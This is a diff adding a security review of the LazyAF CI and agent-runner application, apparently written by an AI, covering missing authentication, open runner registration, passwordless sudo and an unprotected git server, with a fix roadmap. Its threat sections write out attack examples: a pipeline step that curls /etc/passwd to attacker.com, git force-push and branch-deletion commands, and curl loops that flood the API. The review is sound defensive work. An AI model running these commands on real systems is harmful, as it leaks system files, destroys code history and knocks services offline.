@@ -1,0 +1,1232 @@
+================================================================================
+                    LazyAF Security Posture Analysis
+================================================================================
+Conducted by: Claude Sonnet 4.5
+Date: 2026-01-02
+Scope: Complete application security review
+
+================================================================================
+EXECUTIVE SUMMARY
+================================================================================
+
+Current State: ZERO AUTHENTICATION/AUTHORIZATION
+Severity: CRITICAL - Application is completely open
+
+This application is designed for LOCAL DEVELOPMENT or TRUSTED PRIVATE NETWORKS
+ONLY. It has NO built-in security mechanisms and ALL endpoints are publicly
+accessible to anyone who can reach the backend service.
+
+Key Findings:
+✗ No user authentication or authorization layer
+✗ No API authentication (no API keys, JWT, sessions, etc.)
+✗ No runner authentication (self-generated UUIDs)
+✗ No input validation or sanitization on most endpoints
+✗ No rate limiting
+✗ CORS configured but restrictive (only localhost:5173)
+✗ API keys stored in plaintext environment variables
+✗ Runners have passwordless sudo access
+✗ No audit logging
+✗ No encryption for data at rest or in transit (beyond HTTPS if configured)
+
+
+================================================================================
+THREAT MODEL & RISK ASSESSMENT
+================================================================================
+
+ASSUME: Attacker has network access to the backend (port 8000)
+
+HIGH SEVERITY THREATS:
+----------------------
+
+1. ARBITRARY CODE EXECUTION via Runner Impersonation
+   - Attacker can register a malicious "runner" with no authentication
+   - Attacker receives job payloads containing:
+     * Repository URLs (including internal git server)
+     * Branch names
+     * Card descriptions (may contain sensitive info)
+     * API keys context (via agent files)
+   - Attacker can execute arbitrary code in the workspace
+   - Impact: Complete system compromise
+   - Endpoint: POST /api/runners/register
+
+2. REPOSITORY MANIPULATION
+   - Anyone can create, delete, or modify repositories
+   - Anyone can push/pull from internal git server
+   - Anyone can merge branches, delete branches
+   - No branch protection
+   - Impact: Code injection, supply chain attack
+   - Endpoints: POST /api/repos, DELETE /api/repos/{id}, /git/{repo_id}.git/*
+
+3. DATA EXFILTRATION
+   - Anyone can list all repos, cards, jobs, pipelines, agent files
+   - Anyone can read runner logs (may contain secrets)
+   - Anyone can clone any repo from internal git server
+   - Impact: Complete visibility into all operations, secrets exposure
+   - Endpoints: GET /api/*, GET /api/runners/{id}/logs
+
+4. PIPELINE/JOB MANIPULATION
+   - Anyone can create/delete/modify pipelines
+   - Anyone can trigger pipeline runs
+   - Anyone can create cards that execute arbitrary agent tasks
+   - Anyone can inject malicious steps (shell, docker, agent)
+   - Impact: CI/CD poisoning, malicious code execution
+   - Endpoints: POST /api/repos/{id}/cards, POST /api/pipelines
+
+5. DENIAL OF SERVICE
+   - No rate limiting on any endpoint
+   - Anyone can spin up infinite jobs
+   - Anyone can DoS runners by claiming all jobs
+   - Anyone can fill disk with large git operations
+   - Impact: Service unavailability, resource exhaustion
+
+MEDIUM SEVERITY THREATS:
+------------------------
+
+6. WEBSOCKET HIJACKING
+   - WebSocket at /ws has no authentication
+   - Attacker can receive real-time updates on all operations
+   - Impact: Information disclosure, operational intelligence
+
+7. SECRETS EXPOSURE
+   - API keys visible in environment variables
+   - API keys logged in docker-compose output
+   - API keys potentially exposed in git commits
+   - No secrets rotation
+   - Impact: AI API abuse, cost escalation
+
+8. RUNNER PRIVILEGE ESCALATION
+   - Runners have passwordless sudo (NOPASSWD:ALL)
+   - Compromised runner can escape container
+   - Impact: Host system compromise (if container breakout occurs)
+
+9. SQL INJECTION (Low probability but possible)
+   - Using SQLAlchemy ORM which provides protection
+   - However, repo_id and other user inputs used in queries
+   - No explicit input validation
+   - Impact: Database manipulation if ORM bypassed
+
+
+================================================================================
+DETAILED FINDINGS BY CATEGORY
+================================================================================
+
+1. AUTHENTICATION & AUTHORIZATION
+----------------------------------
+
+Current State: ❌ NONE
+
+Backend Endpoints (ALL PUBLIC):
+  /api/repos/*                  - Repository CRUD operations
+  /api/cards/*                  - Card CRUD and state transitions
+  /api/jobs/*                   - Job status and logs
+  /api/runners/*                - Runner registration and management
+  /api/agent-files/*            - Agent template management
+  /api/pipelines/*              - Pipeline CRUD and execution
+  /api/lazyaf-files/*           - Repo-defined agent/pipeline access
+  /api/playground/*             - Ephemeral agent testing
+  /api/models                   - List available AI models
+  /git/{repo_id}.git/*          - Full git server access
+  /ws                           - WebSocket real-time updates
+
+Runner Authentication:
+  - Runners self-generate UUID on startup (runner-claude/entrypoint.py:28)
+  - Backend accepts any UUID via POST /api/runners/register
+  - No shared secret, no API key, no verification
+  - Heartbeat endpoint doesn't validate runner identity
+  - Any attacker can impersonate or create runners
+
+File References:
+  backend/app/main.py:33-46      - No auth middleware configured
+  backend/app/routers/runners.py:124-132 - Open registration
+  runner-claude/entrypoint.py:51-67      - Self-generated UUID
+
+
+2. INPUT VALIDATION & INJECTION VULNERABILITIES
+------------------------------------------------
+
+SQL Injection Risk: ⚠️ LOW (SQLAlchemy ORM provides protection)
+  - All queries use SQLAlchemy ORM which parameterizes queries
+  - Example: backend/app/routers/repos.py:90 - select(Repo).where(Repo.id == repo_id)
+  - No raw SQL detected in codebase
+  - However: User-provided strings (repo_id, branch names, etc.) are not sanitized
+
+Command Injection Risk: ❌ HIGH
+  - Pipeline shell steps execute arbitrary bash commands
+  - No input sanitization on step_config.command field
+  - Example: runner-claude/entrypoint.py:565-678 (execute_script_step)
+  - Writes user input directly to bash script: script_path.write_text(command)
+  - Mitigation: This is by design (users control their pipelines)
+  - Risk: If attacker gains access to pipeline creation, can execute arbitrary commands
+
+Git Repository Injection: ⚠️ MEDIUM
+  - repo_id used in file paths (backend/app/services/git_server.py)
+  - Path traversal possible if repo_id contains "../"
+  - Example: f"{GIT_REPOS_DIR}/{repo_id}.git"
+  - No validation on repo_id format
+  - Recommendation: Validate repo_id against UUID format
+
+API Input Validation: ⚠️ MINIMAL
+  - Pydantic models provide type validation
+  - But no business logic validation:
+    * Branch names not validated against git ref format
+    * Email addresses not validated
+    * URLs not validated for allowed schemes
+    * File paths not validated for traversal
+
+File References:
+  backend/app/routers/pipelines.py:45-107   - Pipeline creation
+  backend/app/schemas/pipeline.py           - Step config models
+  runner-claude/entrypoint.py:564-690       - Command execution
+
+
+3. CORS & NETWORK SECURITY
+---------------------------
+
+CORS Configuration: ⚠️ RESTRICTIVE BUT BYPASSABLE
+  Location: backend/app/config.py:9
+  Default: ["http://localhost:5173"]
+
+  Issues:
+    ✗ Hardcoded to localhost - doesn't support production deployments
+    ✗ Not configurable via environment variable
+    ✗ allow_credentials=True means cookies would be sent (not currently used)
+    ✗ allow_methods=["*"] allows all HTTP methods
+    ✗ allow_headers=["*"] allows all headers
+    ✗ Only protects browser-based attacks, not direct API access
+
+  Recommendations:
+    - Make CORS origins configurable via environment variable
+    - Support multiple origins for dev/staging/prod
+    - Restrict methods to only those needed (GET, POST, PATCH, DELETE)
+    - Disable allow_credentials if not using cookie-based auth
+
+Network Exposure:
+  Backend: 0.0.0.0:8000 (all interfaces)
+  Frontend: 0.0.0.0:5173 (dev) or 0.0.0.0:80 (prod)
+  Git Server: Same port as backend (8000)
+  WebSocket: Same port as backend (8000)
+
+  Recommendations:
+    - Use reverse proxy (nginx) with rate limiting
+    - Implement firewall rules to restrict access
+    - Consider VPN for private network access
+    - Enable HTTPS/TLS termination at reverse proxy
+
+File References:
+  backend/app/main.py:40-46
+  docker-compose.yml:4-5,18-19
+
+
+4. DOCKER & CONTAINER SECURITY
+-------------------------------
+
+Backend Container:
+  ✓ Runs as non-root (implicitly, Python image)
+  ✗ No security options (seccomp, AppArmor)
+  ✗ No resource limits (memory, CPU)
+  ✗ Exposes port directly to host
+  File: backend/Dockerfile
+
+Runner Containers:
+  ⚠️ Runs as non-root user 'runner' (good)
+  ❌ User has passwordless sudo (NOPASSWD:ALL) - CRITICAL RISK
+  ✗ No security options
+  ✗ No resource limits
+  ⚠️ Mounts Docker socket potentially (if docker-in-docker used)
+
+  Sudo Configuration (runner-claude/Dockerfile:27):
+    RUN echo "runner ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+  Why this exists:
+    - Claude Code requires certain permissions
+    - Workspace cleanup may require elevated privileges
+    - BUT: This is extremely dangerous in a security context
+
+  Impact if compromised:
+    - Attacker can install packages
+    - Attacker can modify system files
+    - Attacker can potentially escape container
+
+  Recommendation:
+    - Remove sudo access entirely
+    - Handle privileged operations in entrypoint script before dropping privileges
+    - Use init containers for setup requiring elevated permissions
+    - Implement container isolation (gVisor, Kata Containers)
+
+Container Orchestration:
+  docker-compose.yml:
+    ✗ No security_opt configured
+    ✗ No read_only filesystem
+    ✗ No capability dropping
+    ✗ Restart policy allows infinite restarts
+
+  Recommendations:
+    security_opt:
+      - no-new-privileges:true
+    cap_drop:
+      - ALL
+    cap_add:
+      - NET_BIND_SERVICE (if needed)
+    read_only: true (where possible)
+
+File References:
+  backend/Dockerfile
+  runner-claude/Dockerfile:24-27
+  runner-gemini/Dockerfile:24-27
+  docker-compose.yml
+
+
+5. SECRETS MANAGEMENT
+----------------------
+
+Current State: ❌ PLAINTEXT ENVIRONMENT VARIABLES
+
+API Keys:
+  Location: Environment variables in docker-compose.yml
+  - ANTHROPIC_API_KEY
+  - GEMINI_API_KEY
+  - GITHUB_TOKEN (optional, for PR creation)
+
+  Issues:
+    ✗ Stored in plaintext .env file (not in repo, but on disk)
+    ✗ Visible in docker inspect output
+    ✗ Visible in process list (docker ps, docker-compose config)
+    ✗ Logged in docker-compose up output
+    ✗ No rotation mechanism
+    ✗ Shared between all runners (no per-runner keys)
+    ✗ Backend stores keys in memory (app/config.py)
+
+  Risk Scenarios:
+    1. Logs capture API keys during startup
+    2. Error messages may include environment context
+    3. Compromised runner can read API keys from memory
+    4. Git commits may accidentally include .env file
+
+  Recommendations:
+    - Use Docker secrets (Swarm) or Kubernetes secrets
+    - Use external secret manager (Vault, AWS Secrets Manager, Azure Key Vault)
+    - Rotate keys regularly
+    - Use different keys for different environments
+    - Implement secrets scanning in CI/CD
+    - Never log secrets (implement redaction)
+
+Internal Secrets:
+  ✗ No runner authentication tokens
+  ✗ No webhook secrets for git operations
+  ✗ No session secrets for future auth implementation
+  ✗ Database not encrypted at rest
+
+SQLite Database:
+  Location: /app/data/lazyaf.db (in volume)
+  - Contains all application data
+  - Not encrypted
+  - No access control beyond filesystem permissions
+  - Visible to anyone with volume access
+
+  Recommendation:
+    - Use SQLCipher for encryption at rest
+    - Or migrate to PostgreSQL with TLS and role-based access
+
+File References:
+  backend/app/config.py:11-12,24-25
+  docker-compose.yml:11-12,27,38
+  .env.example
+
+
+6. GIT SERVER SECURITY
+----------------------
+
+Internal Git Server:
+  Implementation: Pure Python (dulwich library)
+  Endpoints:
+    GET  /git/{repo_id}.git/info/refs         - Ref discovery
+    POST /git/{repo_id}.git/git-upload-pack   - Clone/fetch
+    POST /git/{repo_id}.git/git-receive-pack  - Push
+
+  Current Security: ❌ NONE
+    ✗ No authentication on clone/fetch/push
+    ✗ No authorization (anyone can push to any repo)
+    ✗ No branch protection
+    ✗ No push hooks for validation
+    ✗ No signed commits enforcement
+    ✗ No audit logging of git operations
+
+  Attack Scenarios:
+    1. Attacker clones all repositories
+       curl http://backend:8000/git/{repo_id}.git/info/refs?service=git-upload-pack
+
+    2. Attacker pushes malicious code
+       git push http://backend:8000/git/{repo_id}.git main:main --force
+
+    3. Attacker deletes branches
+       git push http://backend:8000/git/{repo_id}.git :branch-name
+
+    4. Attacker rewrites history
+       git push --force to overwrite commits
+
+  Branch Protection Needed:
+    - Protect default branch (main/master) from force push
+    - Require pull request reviews (not currently implemented)
+    - Prevent branch deletion for critical branches
+    - Implement commit signature verification
+
+  Recommendations:
+    HIGH PRIORITY:
+      1. Add authentication to all git endpoints
+      2. Implement per-repository access control
+      3. Add audit logging (who pushed what, when)
+      4. Prevent force-push to protected branches
+
+    MEDIUM PRIORITY:
+      5. Add pre-receive hooks for validation
+      6. Implement commit signing requirements
+      7. Add rate limiting on push operations
+      8. Monitor for suspicious git operations
+
+  Code Complexity:
+    backend/app/services/git_server.py is 1,993 lines - large attack surface
+    Recommendation: Security audit of this file specifically
+
+File References:
+  backend/app/services/git_server.py (1,993 lines)
+  backend/app/routers/git.py
+
+
+7. DATABASE SECURITY
+--------------------
+
+Database: SQLite with aiosqlite
+Location: /app/data/lazyaf.db (Docker volume)
+
+Current State:
+  ✓ SQLAlchemy ORM provides SQL injection protection
+  ✗ No encryption at rest
+  ✗ No row-level security
+  ✗ No audit logging
+  ✗ No backup/restore strategy
+  ✗ Single database file (no replication)
+
+SQL Injection Protection:
+  ✓ All queries use ORM (select, insert, update, delete)
+  ✓ Parameterized queries throughout
+  ✗ But: No explicit input validation before ORM layer
+
+  Example (safe):
+    result = await db.execute(select(Repo).where(Repo.id == repo_id))
+
+Access Control:
+  ✗ No row-level security (RLS)
+  ✗ No multi-tenancy support
+  ✗ All data accessible to anyone with API access
+
+  Future Requirement for Auth:
+    - Need to add user_id foreign key to all tables
+    - Need to filter queries by user_id
+    - Need to implement role-based access control (RBAC)
+      * Admin: Full access
+      * User: Access to own repos/cards/jobs
+      * Viewer: Read-only access
+      * Runner: Special role for runner operations
+
+Data Retention:
+  ✗ No data retention policy
+  ✗ Logs grow indefinitely (Job.logs field)
+  ✗ No automatic cleanup of old jobs/pipelines
+
+Backup:
+  ✗ No automated backup strategy
+  ✗ Volume loss = complete data loss
+
+  Recommendation:
+    - Implement automated backups (daily snapshots)
+    - Store backups in separate location
+    - Test restore procedures
+
+Migration Path:
+  For production deployment, recommend:
+    - PostgreSQL with TLS connections
+    - Connection pooling
+    - Replication for high availability
+    - Point-in-time recovery
+    - Row-level security for multi-tenancy
+
+File References:
+  backend/app/database.py
+  backend/app/models/
+  docker-compose.yml:10 (database path)
+
+
+8. PLAYGROUND SECURITY
+----------------------
+
+Playground allows ephemeral agent testing without creating cards.
+This is a HIGHER RISK feature due to its nature.
+
+Current State: ❌ SAME LACK OF AUTH
+
+Risks:
+  1. Anyone can start playground sessions
+     Endpoint: POST /api/repos/{repo_id}/playground/test
+
+  2. Anyone can stream logs from any session
+     Endpoint: GET /api/playground/{session_id}/stream (SSE)
+
+  3. Anyone can cancel any session
+     Endpoint: POST /api/playground/{session_id}/cancel
+
+  4. Sessions can save to arbitrary branch names
+     Request field: save_to_branch
+
+  5. No rate limiting = DoS vector
+
+Sensitive Data Exposure:
+  - Playground logs streamed via Server-Sent Events (SSE)
+  - Logs may contain sensitive information
+  - Anyone with session_id can view logs
+  - Session IDs are UUIDs but not secret (predictable)
+
+Recommendations:
+  - Require authentication for playground access
+  - Tie sessions to authenticated user
+  - Validate branch names before save
+  - Implement rate limiting (max N sessions per user per hour)
+  - Add session timeouts (auto-cleanup)
+  - Sanitize logs before streaming
+
+File References:
+  backend/app/routers/playground.py
+  backend/app/services/playground_service.py
+
+
+9. PIPELINE SECURITY
+--------------------
+
+Pipelines allow multi-step automation with shell, docker, and agent steps.
+
+Current State: ❌ NO VALIDATION OR SANDBOXING
+
+Risk Scenarios:
+
+  1. Malicious Shell Step:
+     POST /api/pipelines with:
+     {
+       "steps": [{
+         "type": "script",
+         "config": {
+           "command": "curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd)"
+         }
+       }]
+     }
+
+  2. Malicious Docker Step:
+     {
+       "steps": [{
+         "type": "docker",
+         "config": {
+           "image": "attacker/malicious-image",
+           "command": "mine-bitcoin"
+         }
+       }]
+     }
+
+  3. Supply Chain Attack:
+     - Attacker modifies pipeline in .lazyaf/pipelines/ci.yaml
+     - Pipeline runs on every push
+     - Backdoor injected into codebase
+
+Pipeline Triggers:
+  - card_complete: Runs when card status changes
+  - push: Runs on git push to branches
+  - manual: Runs on user request
+
+  No validation that pipeline is authorized to run on trigger
+
+Recommendations:
+  HIGH PRIORITY:
+    1. Implement pipeline approval workflow
+    2. Validate docker images against allowlist
+    3. Sandbox shell execution (restricted filesystem, no network)
+    4. Add audit logging for pipeline executions
+
+  MEDIUM PRIORITY:
+    5. Implement pipeline signing/verification
+    6. Add resource limits (CPU, memory, time)
+    7. Scan docker images for vulnerabilities before pull
+    8. Implement network policies (egress filtering)
+
+File References:
+  backend/app/routers/pipelines.py
+  backend/app/services/pipeline_executor.py
+  backend/app/services/trigger_service.py
+  runner-claude/entrypoint.py:564-831
+
+
+10. AUDIT LOGGING
+-----------------
+
+Current State: ❌ NONE
+
+What's NOT Logged:
+  ✗ Authentication attempts (because auth doesn't exist)
+  ✗ Authorization failures (because authz doesn't exist)
+  ✗ Repository access (clone, push, pull)
+  ✗ Card creation/modification/deletion
+  ✗ Pipeline execution
+  ✗ Runner registration/operations
+  ✗ Configuration changes
+  ✗ API access patterns
+
+What IS Logged:
+  ✓ Runner stdout/stderr (Job.logs)
+  ✓ Application startup messages
+  ✓ Print statements in code (not structured)
+
+Recommendations:
+  Implement structured logging with:
+    - User ID (when auth is implemented)
+    - Action (create, read, update, delete)
+    - Resource type (repo, card, job, pipeline)
+    - Resource ID
+    - Timestamp
+    - IP address
+    - User agent
+    - Success/failure
+    - Error details
+
+  Store audit logs:
+    - Separate database table
+    - Or external service (ELK, Splunk, CloudWatch)
+    - Immutable (append-only)
+    - Retention policy (e.g., 90 days)
+
+  Monitor for:
+    - Failed authentication attempts (when implemented)
+    - Privilege escalation attempts
+    - Unusual API usage patterns
+    - Large data exports
+    - Off-hours activity
+
+
+11. RATE LIMITING & DOS PROTECTION
+-----------------------------------
+
+Current State: ❌ NONE
+
+No rate limiting on any endpoint.
+
+Attack Scenarios:
+
+  1. Job Queue Flooding:
+     while true; do
+       curl -X POST http://backend:8000/api/repos/{id}/cards \
+         -H "Content-Type: application/json" \
+         -d '{"title":"DoS","description":"spam"}'
+     done
+
+  2. Runner Registration Spam:
+     Register 10,000 fake runners to exhaust memory
+
+  3. Git Operations DoS:
+     while true; do
+       git clone http://backend:8000/git/{repo_id}.git /tmp/repo$$
+     done
+
+  4. WebSocket DoS:
+     Open 10,000 WebSocket connections
+
+  5. Large File Upload:
+     Push huge files via git to fill disk
+
+Recommendations:
+  CRITICAL:
+    1. Implement rate limiting at reverse proxy (nginx)
+       - Per IP: 100 requests/minute
+       - Per endpoint: custom limits
+
+    2. Add rate limiting middleware to FastAPI
+       - Use slowapi or fastapi-limiter
+       - Per IP/user rate limits
+
+    3. Implement connection limits
+       - Max WebSocket connections per IP
+       - Max runners per IP
+
+  HIGH PRIORITY:
+    4. Add resource limits
+       - Max job queue size
+       - Max concurrent jobs
+       - Max git repo size
+       - Max log size per job
+
+    5. Implement backpressure
+       - Reject requests when queue is full
+       - Return 429 Too Many Requests
+
+File References:
+  backend/app/main.py (add middleware here)
+
+
+================================================================================
+WHAT'S ACTUALLY OKAY
+================================================================================
+
+Despite the many security gaps, some things are done reasonably well:
+
+1. ✓ SQLAlchemy ORM Usage
+   - All database queries use parameterized queries via ORM
+   - No raw SQL detected
+   - Low SQL injection risk
+
+2. ✓ Pydantic Input Validation
+   - API inputs validated with Pydantic models
+   - Type checking prevents basic input errors
+   - Good foundation for additional validation
+
+3. ✓ Non-Root Containers (Mostly)
+   - Runners run as non-root 'runner' user
+   - Backend runs as non-root (implicit)
+   - However, sudo access negates this benefit
+
+4. ✓ Git Repository Isolation
+   - Each repo has isolated bare repository
+   - Dulwich (pure Python git) avoids shell injection in git operations
+   - Branch-based workflow maintains history
+
+5. ✓ Async Architecture
+   - FastAPI async endpoints
+   - SQLAlchemy async queries
+   - Scales reasonably well
+
+6. ✓ WebSocket Updates
+   - Real-time updates without polling
+   - Efficient architecture
+   - Just needs auth layer
+
+7. ✓ Dependency Management
+   - Modern tooling (uv, npm)
+   - Locked dependencies (uv.lock, package-lock.json)
+   - Reproducible builds
+
+
+================================================================================
+IMPLEMENTATION ROADMAP
+================================================================================
+
+To make this application "fairly secure", here's a phased approach:
+
+PHASE 1: CRITICAL SECURITY (2-3 weeks effort)
+----------------------------------------------
+
+Minimum viable security for semi-trusted network deployment.
+
+1.1. User Authentication & Authorization (HIGH)
+   Estimated Effort: 1 week
+
+   Tasks:
+   □ Create User model (id, email, password_hash, role, created_at)
+   □ Implement JWT-based authentication
+   □ Add POST /api/auth/register endpoint
+   □ Add POST /api/auth/login endpoint (returns JWT)
+   □ Add POST /api/auth/logout endpoint
+   □ Add POST /api/auth/refresh endpoint
+   □ Create auth dependency for protected routes
+   □ Add Authorization header validation middleware
+   □ Implement password hashing (bcrypt or argon2)
+
+   Files to Create/Modify:
+   + backend/app/models/user.py
+   + backend/app/routers/auth.py
+   + backend/app/dependencies/auth.py
+   + backend/app/schemas/user.py
+   ~ backend/app/main.py (add auth middleware)
+
+   Library Dependencies:
+   - python-jose[cryptography] (JWT)
+   - passlib[bcrypt] (password hashing)
+   - python-multipart (form data)
+
+1.2. API Endpoint Protection (HIGH)
+   Estimated Effort: 3 days
+
+   Tasks:
+   □ Add Depends(get_current_user) to all protected endpoints
+   □ Implement ownership checks (user can only access their resources)
+   □ Add admin role for system operations
+   □ Protect git server endpoints with auth
+   □ Protect WebSocket with token-based auth
+
+   Files to Modify:
+   ~ backend/app/routers/repos.py (all endpoints)
+   ~ backend/app/routers/cards.py (all endpoints)
+   ~ backend/app/routers/jobs.py (all endpoints)
+   ~ backend/app/routers/pipelines.py (all endpoints)
+   ~ backend/app/routers/git.py (all endpoints)
+   ~ backend/app/main.py (WebSocket)
+
+1.3. Runner Authentication (HIGH)
+   Estimated Effort: 2 days
+
+   Tasks:
+   □ Add API token field to User model
+   □ Generate API tokens for runner access
+   □ Modify POST /api/runners/register to require API token
+   □ Validate API token on all runner endpoints
+   □ Add runner registration approval (admin must approve)
+
+   Files to Modify:
+   ~ backend/app/routers/runners.py
+   ~ backend/app/models/user.py
+   ~ runner-claude/entrypoint.py
+   ~ runner-gemini/entrypoint.py
+
+1.4. Input Validation & Sanitization (MEDIUM)
+   Estimated Effort: 2 days
+
+   Tasks:
+   □ Add repo_id format validation (UUID)
+   □ Add branch name validation (git ref format)
+   □ Add URL validation for remote_url
+   □ Add email validation
+   □ Add docker image name validation (allowlist)
+   □ Sanitize all user inputs before database storage
+
+   Files to Modify:
+   ~ backend/app/schemas/ (all schema files)
+   + backend/app/utils/validators.py
+
+1.5. Rate Limiting (MEDIUM)
+   Estimated Effort: 1 day
+
+   Tasks:
+   □ Add slowapi middleware to FastAPI
+   □ Configure per-endpoint rate limits
+   □ Add IP-based rate limiting
+   □ Add user-based rate limiting (when auth is implemented)
+   □ Return 429 status code on limit exceeded
+
+   Files to Modify:
+   ~ backend/app/main.py
+   + backend/app/middleware/rate_limit.py
+
+   Library Dependencies:
+   - slowapi
+
+
+PHASE 2: ENHANCED SECURITY (1-2 weeks effort)
+----------------------------------------------
+
+Additional security for production-like deployments.
+
+2.1. HTTPS/TLS (HIGH)
+   Estimated Effort: 1 day
+
+   Tasks:
+   □ Add nginx reverse proxy to docker-compose
+   □ Configure TLS termination
+   □ Redirect HTTP to HTTPS
+   □ Add HSTS headers
+   □ Configure secure cookie settings
+
+   Files to Create/Modify:
+   + nginx/nginx.conf
+   + nginx/Dockerfile
+   ~ docker-compose.yml
+
+2.2. Secrets Management (HIGH)
+   Estimated Effort: 2 days
+
+   Tasks:
+   □ Migrate to Docker secrets or Kubernetes secrets
+   □ Remove API keys from environment variables
+   □ Implement secrets rotation mechanism
+   □ Add secrets scanning to CI/CD
+   □ Redact secrets from logs
+
+   Files to Modify:
+   ~ docker-compose.yml
+   ~ backend/app/config.py
+   + backend/app/utils/secrets.py
+
+2.3. Audit Logging (MEDIUM)
+   Estimated Effort: 3 days
+
+   Tasks:
+   □ Create AuditLog model
+   □ Add audit logging decorator
+   □ Log all authentication attempts
+   □ Log all resource access
+   □ Log all git operations
+   □ Add audit log API endpoints (admin only)
+
+   Files to Create/Modify:
+   + backend/app/models/audit_log.py
+   + backend/app/routers/audit.py
+   + backend/app/utils/audit.py
+   ~ All routers (add audit logging)
+
+2.4. Git Server Authorization (HIGH)
+   Estimated Effort: 3 days
+
+   Tasks:
+   □ Add user_id to Repo model
+   □ Implement per-repo access control
+   □ Add read/write permissions
+   □ Protect default branch from force push
+   □ Add pre-receive hooks for validation
+   □ Log all git operations
+
+   Files to Modify:
+   ~ backend/app/models/repo.py
+   ~ backend/app/routers/git.py
+   ~ backend/app/services/git_server.py
+
+2.5. Container Hardening (MEDIUM)
+   Estimated Effort: 2 days
+
+   Tasks:
+   □ Remove sudo access from runner containers
+   □ Add security_opt to docker-compose
+   □ Drop unnecessary capabilities
+   □ Add read-only filesystem where possible
+   □ Implement resource limits
+   □ Add seccomp profile
+
+   Files to Modify:
+   ~ runner-claude/Dockerfile
+   ~ runner-gemini/Dockerfile
+   ~ docker-compose.yml
+
+
+PHASE 3: ADVANCED SECURITY (1-2 weeks effort)
+----------------------------------------------
+
+For highly secure or multi-tenant deployments.
+
+3.1. Multi-Tenancy & RBAC (HIGH)
+   Estimated Effort: 1 week
+
+   Tasks:
+   □ Add Organization model
+   □ Add user_id to all models
+   □ Implement row-level security
+   □ Add role-based access control (Admin, User, Viewer)
+   □ Add team/organization support
+   □ Filter all queries by user context
+
+   Files to Create/Modify:
+   + backend/app/models/organization.py
+   + backend/app/models/team.py
+   ~ All models (add user_id foreign key)
+   ~ All routers (add RLS filters)
+
+3.2. Database Encryption (MEDIUM)
+   Estimated Effort: 2 days
+
+   Tasks:
+   □ Migrate to PostgreSQL
+   □ Configure TLS connections
+   □ Implement encryption at rest
+   □ Add connection pooling
+   □ Add replication for HA
+
+   Files to Modify:
+   ~ backend/app/database.py
+   ~ backend/app/config.py
+   ~ docker-compose.yml
+
+3.3. Pipeline Sandboxing (HIGH)
+   Estimated Effort: 3 days
+
+   Tasks:
+   □ Implement docker image allowlist
+   □ Add network policies (egress filtering)
+   □ Add resource limits per pipeline
+   □ Scan docker images for vulnerabilities
+   □ Implement pipeline approval workflow
+
+   Files to Modify:
+   ~ backend/app/services/pipeline_executor.py
+   ~ runner-claude/entrypoint.py
+
+3.4. Vulnerability Scanning (MEDIUM)
+   Estimated Effort: 2 days
+
+   Tasks:
+   □ Add Dependabot for dependency scanning
+   □ Add CodeQL for code scanning
+   □ Add Trivy for container scanning
+   □ Add pre-commit hooks for secrets scanning
+   □ Configure automated security updates
+
+   Files to Create:
+   + .github/dependabot.yml
+   + .github/workflows/codeql.yml
+   + .github/workflows/trivy.yml
+   + .pre-commit-config.yaml
+
+3.5. Monitoring & Alerting (MEDIUM)
+   Estimated Effort: 3 days
+
+   Tasks:
+   □ Add Prometheus metrics
+   □ Add Grafana dashboards
+   □ Configure alerts for security events
+   □ Add anomaly detection
+   □ Add incident response runbooks
+
+   Files to Create/Modify:
+   + backend/app/middleware/metrics.py
+   + monitoring/prometheus.yml
+   + monitoring/grafana/dashboards/
+
+
+================================================================================
+BIGGEST CONCERNS (TOP 5)
+================================================================================
+
+1. ❌ ZERO AUTHENTICATION
+   Impact: CRITICAL
+   Anyone can do anything. This is the #1 priority to fix.
+   Effort: 1-2 weeks
+
+2. ❌ RUNNER IMPERSONATION
+   Impact: CRITICAL
+   Attacker can register malicious runner and receive jobs with sensitive data.
+   Effort: 2-3 days
+
+3. ❌ GIT SERVER ACCESS
+   Impact: HIGH
+   Anyone can clone all repos, push malicious code, rewrite history.
+   Effort: 3-5 days
+
+4. ❌ PIPELINE EXECUTION
+   Impact: HIGH
+   Anyone can create pipeline with arbitrary shell/docker commands.
+   Effort: 2-3 days
+
+5. ❌ SUDO ACCESS IN RUNNERS
+   Impact: HIGH
+   Compromised runner can potentially escape container.
+   Effort: 1-2 days
+
+
+================================================================================
+EFFORT ESTIMATION SUMMARY
+================================================================================
+
+Phase 1 (Critical Security):      2-3 weeks (1 developer)
+Phase 2 (Enhanced Security):       1-2 weeks (1 developer)
+Phase 3 (Advanced Security):       1-2 weeks (1 developer)
+                                  -------------------------
+Total Effort:                      4-7 weeks (1 developer)
+
+OR
+
+Phase 1 only (Minimum Viable):    2-3 weeks (1 developer)
+  - Sufficient for semi-trusted private network
+  - Not suitable for public internet exposure
+  - Not suitable for multi-tenant deployment
+
+
+================================================================================
+RECOMMENDED IMMEDIATE ACTIONS
+================================================================================
+
+If you need to deploy this application TODAY:
+
+1. 🔒 NETWORK ISOLATION (MANDATORY)
+   - Deploy on private network only
+   - Use VPN for access
+   - Firewall rules: Only allow trusted IPs
+   - Do NOT expose to public internet
+
+2. 📝 ACCEPT THE RISK
+   - Document that authentication is not implemented
+   - Get sign-off from stakeholders
+   - Plan for Phase 1 implementation
+
+3. 🛡️ COMPENSATING CONTROLS
+   - Implement reverse proxy with rate limiting
+   - Enable HTTPS/TLS
+   - Monitor logs for suspicious activity
+   - Regular security reviews
+
+4. 🚨 INCIDENT RESPONSE
+   - Have plan for security incident
+   - Regular backups of database
+   - Document who has access
+   - Monitor for unauthorized access
+
+
+================================================================================
+TESTING RECOMMENDATIONS
+================================================================================
+
+After implementing security fixes:
+
+1. Penetration Testing
+   - Hire external security firm
+   - Test authentication bypass
+   - Test authorization bypass
+   - Test injection vulnerabilities
+   - Test for privilege escalation
+
+2. Automated Security Testing
+   - OWASP ZAP or Burp Suite for web app scanning
+   - SQLMap for SQL injection testing
+   - Nuclei for vulnerability scanning
+   - Bandit for Python code security analysis
+
+3. Security Code Review
+   - Manual review of authentication logic
+   - Review of authorization checks
+   - Review of input validation
+   - Review of secret handling
+
+4. Compliance Checks
+   - OWASP Top 10 compliance
+   - CWE Top 25 compliance
+   - PCI DSS (if handling payment data)
+   - GDPR (if handling EU user data)
+
+
+================================================================================
+CONCLUSION
+================================================================================
+
+CURRENT STATE: This application is effectively a "trusted environment only" tool
+               with NO security controls. It is designed for local development
+               or deployment in a completely trusted private network.
+
+TO MAKE FAIRLY SECURE: Implement Phase 1 (Critical Security) at minimum.
+                       This adds user authentication, API protection, and
+                       runner authentication. Estimated effort: 2-3 weeks.
+
+FOR PRODUCTION: Implement all three phases. Estimated effort: 4-7 weeks.
+
